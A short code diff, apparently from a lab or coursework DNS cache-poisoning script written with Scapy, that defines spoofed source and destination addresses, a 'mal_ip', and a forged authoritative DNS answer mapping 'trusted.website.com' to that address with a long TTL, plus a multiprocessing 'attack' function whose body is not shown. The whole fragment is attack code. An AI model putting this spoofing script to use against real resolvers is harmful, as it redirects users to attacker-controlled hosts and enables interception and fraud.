@@ -3,16 +3,18 @@ import multiprocessing as mp
 
 src_ip="192.168.0.100"
 dst_ip="192.168.0.200"
+mal_ip="192.168.0.151"
 
 src_port=53
 dst_port=6666
 
+website='trusted.website.com'
+ttl=500000
+
 #precompute standard object
-response=(IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port,sport=src_port)/DNS(id=1, qr=1, aa=1, qd=DNSQR(qname='trusted.website.com'), an=DNSRR(rrname='trusted.website.com', ttl=604769, rdata="192.168.0.151")))
+response=(IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port,sport=src_port)/DNS(id=1, qr=1, aa=1, qd=DNSQR(qname=website), an=DNSRR(rrname=website, ttl=ttl, rdata=mal_ip)))
 dns_layer = response[DNS]
 
-#list of messages
-pkt_list = []
 s = conf.L3socket()
 
 def attack(start, end):
